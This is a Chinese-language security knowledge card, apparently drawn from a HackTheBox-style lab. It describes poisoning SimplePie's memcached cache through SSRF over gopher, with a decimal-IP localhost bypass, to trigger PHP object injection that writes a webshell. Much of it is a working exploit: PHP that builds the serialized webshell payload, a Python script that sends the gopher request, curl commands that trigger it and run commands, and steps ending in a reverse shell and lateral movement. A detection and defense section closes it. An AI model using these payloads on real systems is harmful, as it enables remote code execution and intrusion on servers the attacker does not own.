---
id: web-php-deserialization-simplepie-memcache-poisoning
title: SimplePie memcached 缓存投毒 → PHP 对象注入 → 日志目录写 WebShell
type: scenario
domain: web
path: web/php/deserialization
technique: simplepie-memcache-cache-poisoning-object-injection
aliases:
- SimplePie 缓存反序列化
- memcache 缓存投毒
- TemplateHelper __wakeup
- xct_ 缓存 key
- 缓存 key md5 推导
- PHP 对象注入写 webshell
tags:
- php
- deserialization
- simplepie
- memcache
- ssrf
- gopher
- webshell
- file-write
- wordpress
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T12:16:32+08:00'
  notes: 已对照全文与图14/15/16核对：rss_template.php 设 memcache://127.0.0.1:11211/?prefix=xct_，safe() 放行 gopher 并用十进制 2130706433 绕过 localhost/127.0.0.1；缓存 key 由 md5(md5(feed):spc) 推导为 xct_4e5612ba079c530a6b1f148c0b352241（与 ?debug 输出一致）；图16 xxd 显示私有属性序列化串含 00 字节；TemplateHelper::__wakeup→file_put_contents 写 logs/exp.php，实测 www-data 命令执行。卡内 PoC 一致。未验证点：PoC 未在本机执行；Memcache 类具体 load 行为按原文源码摘录。frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

当应用用 SimplePie 的 `memcache://` 缓存解析 RSS，且 memcached 可从本机无认证访问时，攻击者可通过 SSRF + gopher 向 SimplePie 使用的缓存 key（`prefix + md5(md5(feed_url):spc)`）写入一段序列化字符串；SimplePie 的 `Memcache::load()` 直接 `unserialize()` 该值，触发应用内 `TemplateHelper::__wakeup()` 的 `file_put_contents(__DIR__.'/logs/'.$file, $data)`，把 WebShell 写进日志目录。

## 原理

- SimplePie 的缓存后端 `Memcache` 在保存时执行 `serialize($data)`，读取时执行 `unserialize($data)`，没有 `allowed_classes` 白名单；因此缓存内容等价于一个 PHP 反序列化入口。
- 缓存 key 可预测：
  - `get_cache_filename($feed_url)` 默认返回 `md5($feed_url)`；
  - 缓存处理器用 `Base::TYPE_FEED = 'spc'` 作为类型；
  - `Memcache::__construct` 计算 `$this->name = prefix . md5("$name:$type")`；
  - 所以 key = `prefix + md5(md5(feed_url) . ':spc')`。例如默认 feed `http://www.travel.htb/newsfeed/customfeed.xml` → `md5(feed)` = `3903a76d...` → `md5("3903a76d...:spc")` = `4e5612ba...` → key `xct_4e5612ba079c530a6b1f148c0b352241`。
- memcached 文本协议是明文的行协议，`set <key> <flags> <exptime> <bytes>\r\n<data>\r\n` 即可写入；配合 SSRF 的 `gopher://`（十进制 IP 绕过 localhost 黑名单）就能从 Web 进程向 `127.0.0.1:11211` 发送该命令。
- 触发点在应用代码：`rss_template.php` 里 `set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_')`，页面加载 feed 时 SimplePie 调用 `Memcache::load()`，对攻击者写入的值执行 `unserialize()`。
- Gadget：`template.php` 中 `TemplateHelper` 的 `__wakeup()` 调用 `init($this->file, $this->data)`，最终执行 `file_put_contents(__DIR__.'/logs/'.$this->file, $this->data)`；`$file`/`$data` 都是私有属性，但反序列化会按序列化流恢复它们。写入 `exp.php` 后，日志目录可被 Web 访问，即获得命令执行。
- 为什么成立：缓存 key 由公开的 feed URL 决定、memcached 无认证且仅监听回环、SSRF 过滤器只做字符串黑名单、应用类中存在 `__wakeup` 文件写 sink——四个条件同时满足时，不需要任何数据库或文件上传权限即可 RCE。
- 信息泄露辅助：应用若提供 `?debug` 参数并 include `debug.php`，会打印缓存 key 与序列化数据，可用于确认 key 推导和触发时机。

## 触发条件

- 应用使用 SimplePie（或类似库）并把缓存位置设为 `memcache://127.0.0.1:11211`，memcached 无认证。
- 存在 URL 可控的 SSRF 且允许 `gopher://`（或攻击者能以其他方式写 memcached）。
- 缓存 key 可计算（feed URL 已知）或可通过 debug/报错泄露。
- 应用 classpath 中存在带 `__wakeup`/`__destruct` 文件写 sink 的类，且可被自动加载。
- 写入目录（如主题 `logs/`）对 Web 进程可写且可被 HTTP 访问。

## 利用步骤

1. 审计源码，定位 `set_cache_location('memcache://...')`、`set_feed_url($url)`、缓存处理器与 `unserialize` 调用。
2. 确认缓存 key 算法：`prefix + md5(md5(feed_url) . ':spc')`；用 `md5sum` 或 Python 复算，并用 `?debug` 输出比对。
3. 审计应用类，找 `__wakeup`/`__destruct` 中的文件写 sink；构造 `TemplateHelper` 对象，`file=exp.php`，`data=<?php system($_REQUEST["cmd"]);?>`。
4. 生成序列化串；因私有属性名含 `\0` 字节，先 base64 编码保存，使用时再解码（直接复制文本会丢失隐藏字节）。
5. 通过 SSRF 发 gopher 请求，向 memcached 写入 `set <key> 4 0 <len>\r\n<serialized>\r\n`；主机用十进制 `2130706433` 绕过 `127.0.0.1` 黑名单。
6. 请求正常的 feed 页面（不带 `custom_feed_url`），让 SimplePie 读取被投毒的 key 并 `unserialize`。
7. 访问写入的 WebShell（如 `/wp-content/themes/twentytwenty/logs/exp.php?cmd=id`），确认命令执行。
8. 反弹 Shell 或继续横向。

## PoC

构造 payload（PHP）：

```php
<?php
class TemplateHelper {
    private $file;
    private $data;
    public function __construct(string $file, string $data) {
        $this->file = $file;
        $this->data = $data;
    }
    public function __wakeup() {
        file_put_contents(__DIR__ . '/logs/' . $this->file, $this->data);
    }
}
$a = new TemplateHelper('exp.php', '<?php system($_REQUEST["cmd"]);?>');
echo base64_encode(serialize($a));
// 私有属性序列化后包含 \0TemplateHelper\0file / \0TemplateHelper\0data
```

投毒（Python）：

```python
import base64, requests
from urllib.parse import quote

# 原文 payload 的 base64（私有属性 \0 字节已保留）
serialize_payload = "TzoxNDoiVGVtcGxhdGVIZWxwZXIiOjI6e3M6MjA6IgBUZW1wbGF0ZUhlbHBlcgBmaWxlIjtzOjc6ImV4cC5waHAiO3M6MjA6IgBUZW1wbGF0ZUhlbHBlcgBkYXRhIjtzOjMzOiI8P3BocCBzeXN0ZW0oJF9SRVFVRVNUWyJjbWQiXSk7Pz4iO30="
data = base64.b64decode(serialize_payload).decode()
key = "xct_4e5612ba079c530a6b1f148c0b352241"
payload = f"\r\nset {key} 4 0 {len(data)}\r\n{data}\r\n"

host = int("7f000001", 16)  # 2130706433，绕过 127.0.0.1 黑名单
url = f"gopher://{host}:11211/_{quote(payload)}"
requests.get(f"http://target/awesome-rss/?custom_feed_url={url}")
```

触发与利用：

```bash
# 正常请求 feed 页面，触发 Memcache::load() -> unserialize()
curl http://target/awesome-rss/

# 访问写入的 webshell
curl 'http://target/wp-content/themes/twentytwenty/logs/exp.php' -G -d 'cmd=id'
```

说明：PoC 为原文链路的精简复现，未在本机执行；仅用于授权测试。

## 变体与关联

- 变体：SimplePie 也支持 `redis://`、`mysql://`、`file://` 缓存；Redis 用 `unserialize` 的同理会同样中招，只是投毒协议不同。
- 变体：若 `TemplateHelper` 不可用，可寻找其他 `__wakeup`/`__destruct` gadget；若 `logs/` 不可执行，可写 `.htaccess`、模板文件或计划任务。
- 变体：缓存 key 若不可预测（自定义 name filter），可通过 `?debug`、报错或盲写多个 key 增加命中率。
- 关联：[[web-generic-ssrf-ip-notation-blacklist-bypass]]（十进制/十六进制 IP 绕过字符串黑名单）；[[web-generic-ssrf-curl-gopher-loopback-admin]]（curl+gopher 打回环服务）；[[web-php-deserialization-pop-filelogger-webshell]]（同类"魔术方法写文件"POP 链）；[[web-php-deserialization-reflection-private-property-payload]]（私有属性序列化的构造细节）。
- 边界：memcached 有认证/绑定非回环、SSRF 禁止 gopher、缓存使用 `allowed_classes` 白名单、类中没有文件写 sink 时，本链不成立。

## 检测与防御

- 检测：Web 进程向 127.0.0.1:11211 发起连接；请求参数出现 `gopher://`、`2130706433`、`custom_feed_url`；memcached 中出现 `xct_` 前缀且值以 `O:`/`a:` 开头的条目。
- 检测：主题/上传目录出现新的 `.php` 文件，尤其是 `logs/` 下的可执行文件；`unserialize` 报错或对象注入告警。
- 防御：不要对缓存数据使用 PHP `serialize/unserialize`，改用 JSON；必须使用时加 `allowed_classes` 白名单。
- 加固：memcached 设置认证、只监听 unix socket 或绑定 127.0.0.1 并限制本机访问；SSRF 侧解析最终 IP、禁止 gopher；`logs/` 等可写目录禁止 PHP 执行（`php_admin_flag engine off`）。
- 修复：升级/改造 SimplePie 缓存实现，避免反序列化不可信缓存；清理应用中的文件写魔术方法。

